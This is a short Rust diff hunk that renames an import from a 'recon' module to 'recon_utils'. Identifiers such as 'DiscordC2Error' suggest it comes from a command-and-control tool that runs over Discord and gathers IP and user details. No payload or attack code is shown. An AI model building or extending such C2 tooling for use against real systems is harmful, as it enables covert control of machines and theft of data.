@@ -1,7 +1,7 @@
 use crate::{
     discord_utils::channels::*,
     errors::DiscordC2Error,
-    os::recon::{ip, user},
+    os::recon_utils::{ip, user},
 };
 
 #[cfg(target_os = "linux")]
